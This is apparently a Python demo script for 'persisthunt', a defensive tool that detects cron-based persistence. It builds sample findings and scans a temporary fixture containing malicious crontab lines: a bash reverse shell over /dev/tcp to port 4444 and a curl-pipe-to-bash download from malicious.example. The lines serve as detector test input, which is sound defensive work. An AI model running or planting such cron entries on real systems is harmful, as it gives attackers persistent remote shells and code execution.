import json
from pathlib import Path
from tempfile import TemporaryDirectory

from persisthunt.findings import Finding, FindingCollection, Severity
from persisthunt.detectors.cron import CronDetector

def demo_stage1_findings():
    print("=== Stage 1: Finding Model & Collection Demo ===")
    collection = FindingCollection()

    # 1 INFO finding
    collection.add(Finding(
        id="PH-TEST-001", category="general", severity=Severity.INFO,
        title="Info level finding", description="Just some info."
    ))

    # 1 LOW finding
    collection.add(Finding(
        id="PH-TEST-002", category="general", severity=Severity.LOW,
        title="Low level finding", description="A low severity issue."
    ))

    # 1 MEDIUM finding
    collection.add(Finding(
        id="PH-TEST-003", category="general", severity=Severity.MEDIUM,
        title="Medium level finding", description="A medium severity issue."
    ))

    # 1 HIGH finding
    collection.add(Finding(
        id="PH-TEST-004", category="systemd", severity=Severity.HIGH,
        title="High level finding", description="A high severity issue.",
        evidence="ExecStart=/tmp/malicious"
    ))

    # 1 CRITICAL finding
    collection.add(Finding(
        id="PH-TEST-005", category="cron", severity=Severity.CRITICAL,
        title="Critical level finding", description="A critical severity issue."
    ))

    print("--- Stored Findings ---")
    print(f"Total stored: {collection.count()} (Expected: 5)")

    print("\n--- Filtering by Severity (HIGH) ---")
    highs = collection.by_severity(Severity.HIGH)
    print(f"High severity findings: {len(highs)} (Expected: 1)")
    print(f"ID: {highs[0].id}")

    print("\n--- Filtering by Category (systemd) ---")
    sys_cats = collection.by_category("systemd")
    print(f"Systemd findings: {len(sys_cats)} (Expected: 1)")

    print("\n--- Statistics ---")
    stats = collection.severity_counts()
    for k, v in stats.items():
        print(f"{k}: {v}")


def demo_stage2_cron_detector():
    print("\n=== Stage 2: Cron Persistence Detector Demo ===")

    # 1. Live audit on host system
    print("\n--- Scanning Local Host System ---")
    detector = CronDetector()
    print(f"Detector Name: {detector.name}")
    print(f"Detector Identifier: {detector.detector_id}")

    host_findings = detector.scan()
    print(f"Host cron findings detected: {host_findings.count()}")
    print(f"Host finding severity distribution: {host_findings.severity_counts()}")

    # 2. Emulated audit with suspicious indicators
    print("\n--- Scanning Controlled Suspicious Fixture ---")
    with TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        etc_crontab = root / "etc" / "crontab"
        cron_d = root / "etc" / "cron.d"
        cron_daily = root / "etc" / "cron.daily"
        spool = root / "var" / "spool" / "cron" / "crontabs"

        cron_d.mkdir(parents=True)
        cron_daily.mkdir(parents=True)
        spool.mkdir(parents=True)

        # Suspicious entries
        etc_crontab.write_text(
            "# System crontab with benign and suspicious entries\n"
            "SHELL=/bin/sh\n"
            "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin\n"
            "0 1 * * * root /usr/bin/backup-logs.sh\n"
            "* * * * * root /bin/bash -i >& /dev/tcp/198.51.100.1/4444 0>&1\n"
        )

        (cron_d / "updater").write_text(
            "* * * * * root curl -fsSL https://malicious.example/payload.sh | bash\n"
            "0 0 * * * root /tmp/staged_script.sh\n"
        )

        (spool / "bob").write_text(
            "*/10 * * * * python3 -c 'import socket; print(1)'\n"
        )

        mock_detector = CronDetector(root_prefix=root)
        mock_findings = mock_detector.scan()

        print(f"Fixture findings detected: {mock_findings.count()}")
        print(f"Severity breakdown: {mock_findings.severity_counts()}")
        print("\nFindings detail:")
        for f in mock_findings:
            print(f"[{f.severity.value}] {f.id} - {f.title}")
            print(f"  Location: {f.location}")
            print(f"  Evidence: {f.evidence}")
            print(f"  Recommendation: {f.recommendation}")
            print()

        print("--- Fixture Findings JSON Output ---")
        print(json.dumps(mock_findings.to_dict(), indent=2))

def main():
    demo_stage1_findings()
    demo_stage2_cron_detector()

if __name__ == "__main__":
    main()
